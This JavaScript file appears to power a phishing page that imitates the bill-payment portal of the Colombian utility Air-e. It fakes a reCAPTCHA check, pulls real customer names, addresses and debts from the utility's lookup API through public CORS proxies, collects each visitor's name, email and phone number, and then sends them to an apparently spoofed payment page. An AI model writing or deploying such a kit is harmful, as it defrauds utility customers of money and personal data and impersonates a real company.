// --- 1. LÓGICA DE MENÚ ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA DE CONSULTA ULTRA-RÁPIDA ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nic = inputNic.value.trim();
        if(!nic) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `
            <div class="full-loader-container">
                <div class="big-loader"></div>
                <p>Consultando deuda...</p>
            </div>`;

        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // Lista de proxies para la "carrera"
        const proxies = [
            `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
            `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`,
            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&_=${Date.now()}`
        ];

        // Función interna para procesar cada proxy individualmente
        const fetchIntent = async (url) => {
            const response = await fetch(url);
            if (!response.ok) throw new Error("Fallo");
            const result = await response.json();
            
            let raw = result.contents ? result.contents : result;
            let parsed = (typeof raw === 'string') ? JSON.parse(raw) : raw;

            if (parsed && (parsed.ACCOUNTS || parsed.NAME)) return parsed;
            throw new Error("Datos inválidos");
        };

        try {
            // PROMISE.ANY lanza todos los proxies al mismo tiempo. 
            // El primero que responda correctamente detiene a los demás. ¡Es instantáneo!
            const finalData = await Promise.any(proxies.map(url => fetchIntent(url)));
            
            renderizarFormulario(finalData, nic);

        } catch (err) {
            console.error("Ningún proxy funcionó:", err);
            alert("Error de conexión. El servidor de Air-e no responde. Intenta de nuevo.");
            location.reload();
        }
    });
}

// Función separada para no repetir código de diseño
function renderizarFormulario(finalData, nic) {
    const info = finalData.ACCOUNTS || finalData;
    const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
    const nombreUsuario = finalData.NAME || info.NAME || "USUARIO AIR-E";
    
    let valorMesNum = 0;
    if (info.INVOICES && info.INVOICES.length > 0) {
        valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
    }

    whitePanel.innerHTML = `
    <div class="invoice-view">
        <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
        <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px; border:1px solid #d1d9e6;">
            <strong style="display:block; color:#004a99; text-transform:uppercase;">${nombreUsuario}</strong>
            <small>${info.COLLECTION_ADDRESS || 'Dirección de suministro'}</small>
        </div>
        
        <div class="invoice-form-grid">
            <div class="required-note">* Indica campo requerido</div>
            <div class="invoice-input-group">
                <label class="invoice-label">NIC <span>*</span></label>
                <input type="text" class="invoice-field" id="numId" value="${nic}" readonly>
            </div>
            <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
            <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
            <div class="invoice-input-group"><label class="invoice-label">Correo <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
            <div class="invoice-input-group"><label class="invoice-label">Celular <span>*</span></label><input type="text" class="invoice-field" id="celular"></div>
            <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS || ''}">
        </div>

        <div class="payment-cards-grid">
            <div class="payment-card">
                <div class="pay-card-title">Valor del mes</div>
                <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
            </div>
            <div class="payment-card">
                <div class="pay-card-title">Deuda Total</div>
                <div class="pay-card-amount" style="color:#d32f2f;">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
            </div>
        </div>

        <div class="invoice-footer">
            <div class="terms-check"><input type="checkbox" id="checkTerm" checked><span>Acepto tratamiento de datos personales.</span></div>
            <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
        </div>
    </div>`;
}

// --- 4. FUNCIÓN DE GUARDADO COMPLETA ---
window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value.trim();
    const ape = document.getElementById('apellidos').value.trim();
    const mail = document.getElementById('correo').value.trim();
    const cel = document.getElementById('celular').value.trim();

    if(!nom || !ape || !mail || !cel) {
        alert("Por favor, complete todos los campos requeridos.");
        return;
    }

    const datosFactura = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        celular: cel,
        direccion: document.getElementById('direccion').value,
        montoPagar: parseInt(monto),
        tipoPago: tipo,
        referencia: "AIR" + Math.floor(Math.random() * 900000 + 100000),
        fecha: new Date().toLocaleDateString()
    };
    
    localStorage.setItem('datosFactura', JSON.stringify(datosFactura));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
